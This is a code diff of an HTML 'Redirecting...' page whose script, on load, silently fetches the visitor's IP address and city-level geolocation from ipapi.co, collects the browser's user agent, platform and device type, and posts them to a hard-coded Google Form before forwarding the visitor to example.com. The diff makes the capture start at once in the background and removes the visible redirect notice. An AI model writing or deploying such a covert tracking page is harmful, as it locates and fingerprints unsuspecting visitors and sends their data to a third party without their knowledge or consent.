@@ -2,51 +2,56 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
     <script>
-        // URL to redirect to after capturing data
+        // Set the destination URL
         const REDIRECT_URL = "https://example.com";
 
-        // Function to send data to Google Form and then redirect
-        async function sendDataAndRedirect() {
-            try {
-                // Fetch IP and Geolocation data from a free API
-                const geoResponse = await fetch('https://ipapi.co/json/');
-                const geoData = await geoResponse.json();
+        // This function contains the logic
+        function initRedirectAndCapture() {
+            // Start sending data in the background
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(geoData => {
+                    const timestamp = new Date().toISOString();
+                    const userAgent = navigator.userAgent;
+                    const os = navigator.platform;
 
-                // Get other details from the user's browser
-                const timestamp = new Date().toISOString();
-                const userAgent = navigator.userAgent;
-                const os = navigator.platform;
-                const device = navigator.vendor;
+                    let deviceInfo = 'Unknown';
+                    if (navigator.userAgentData) {
+                        const platform = navigator.userAgentData.platform;
+                        const isMobile = navigator.userAgentData.mobile ? 'Mobile' : 'Desktop';
+                        deviceInfo = `${platform} (${isMobile})`;
+                    } else {
+                        const isMobile = /Mobi/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+                        deviceInfo = `${navigator.platform} (${isMobile})`;
+                    }
 
-                // Create a FormData object with your specific entry IDs
-                const formData = new FormData();
-                formData.append("entry.1496883719", timestamp);
-                formData.append("entry.1535774579", geoData.ip);
-                formData.append("entry.2067837825", os);
-                formData.append("entry.747657848", device);
-                formData.append("entry.1734202770", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
-                formData.append("entry.448354724", userAgent);
+                    const formData = new FormData();
+                    formData.append("entry.1496883719", timestamp);
+                    formData.append("entry.1535774579", geoData.ip);
+                    formData.append("entry.2067837825", os);
+                    formData.append("entry.747657848", deviceInfo);
+                    formData.append("entry.1734202770", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
+                    formData.append("entry.448354724", userAgent);
 
-                // Submit to your specific Google Form action URL
-                await fetch("https://docs.google.com/forms/d/e/1FAIpQLSehg2hY3VPki5je6DE8lAmLPcXTGdk4ReZ7FCGxX_SZ3OJ0yg/formResponse", {
-                    method: "POST",
-                    body: formData,
-                    mode: "no-cors" // Important to prevent CORS errors
-                });
+                    fetch("https://docs.google.com/forms/d/e/1FAIpQLSehg2hY3VPki5je6DE8lAmLPcXTGdk4ReZ7FCGxX_SZ3OJ0yg/formResponse", {
+                        method: "POST",
+                        body: formData,
+                        mode: "no-cors"
+                    });
+                })
+                .catch(err => console.error(err));
 
-            } catch (error) {
-                console.error("Error capturing data:", error);
-            } finally {
-                // ALWAYS redirect the user, even if data capture fails
-                window.location.href = REDIRECT_URL;
-            }
+            // Redirect the user immediately
+            window.location.href = REDIRECT_URL;
         }
+
+        // --- NEW: Call the function immediately ---
+        // This runs as soon as the script is read by the browser, instead of waiting for the page to load.
+        initRedirectAndCapture();
     </script>
 </head>
-<body onload="sendDataAndRedirect()">
-    <p>You are being redirected. If you are not redirected automatically, <a href="https://example.com">click here</a>.</p>
-</body>
+<body>
+    </body>
 </html>
